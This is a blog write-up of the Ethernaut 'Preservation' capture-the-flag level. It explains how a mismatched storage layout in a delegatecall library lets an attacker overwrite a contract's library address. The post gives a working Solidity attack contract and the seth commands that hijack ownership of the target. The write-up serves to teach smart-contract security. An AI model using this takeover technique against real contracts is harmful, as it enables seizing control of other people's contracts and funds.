---
layout: post
title:  "OpenZeppelin Ethernaut 16: Preservation"
date:   2022-07-08 17:05:16 +0800
---
The preservation challenge from Ethernaut is designed to test your understanding of storage and how storage variable declaration works when it comes to delegate calls.

The challenge text is: _"This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored. The goal of this level is for you to claim ownership of the instance you are given."_

Our objective is to become the owner of the contract, but having a look at the `LibraryContract` we see that `storedTime` is being changed, not owner.

However, the security issue with this contract is that order in which variable are declared matter. In delegate contracts the storage variable declaration order needs to match the caller. In this case it doesn't, we can see that `storedTime` in `LibraryContract` aligns with `timeZone1Library` in `Preservation`. This means that when the `LibraryContract` attempts to write to `storedTime` through the delegated call, it will actually write to the storage slot associated with `timeZone1Library`.

So we are able to change `timeZone1Library`, what can we do with this? Well we are able to control an address that is used for delegated calls so we can do whatever we want really. But since we want to become the owner of the contract, let's do that. We have to deploy a smart contract that when `setTime()` is called, it changes the `owner` storage variable to our address.

Here is our malicious contract:
{% highlight solidity %}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract Attack {
        address public timeZone1Library;
        address public timeZone2Library;
        address public owner;

        function setTime(uint _time) public {
                owner = address(0xd4057e08B9d484d70C5977784fC1f6D82d45ff67);
        }
}
{% endhighlight %}

So we have our malicious contract that we've deployed, so let's start the process of attacking our target contract.

Firstly we need to change the storage slot corresponding to `timeZone1Library` with the address of our malicious contract.
```
dev@dev:~/dev/ctf/ethernaut/16$ seth send 0xe1C918e75B1EeB66F6AeABcCc25f15C5a387bB60 "setFirstTime(uint)" 0x7de4414ee9c9Dead0314765ec77Ee39e6e244cF7
```

Now our malicious address will be called when the contract does the delegated call in the function `setFirstTime()`. So let's call it. Note that the input for this function call doesn't matter, so I just choose to use `0x1`.
```
dev@dev:~/dev/ctf/ethernaut/16$ seth send 0xe1C918e75B1EeB66F6AeABcCc25f15C5a387bB60 "setFirstTime(uint)" 0x1
```

And now we're the owner of the contract! Let's verify just to be sure:
```
dev@dev:~/dev/ctf/ethernaut/16$ seth call 0xe1C918e75B1EeB66F6AeABcCc25f15C5a387bB60 "owner()(address)"
0xd4057e08B9d484d70C5977784fC1f6D82d45ff67
```
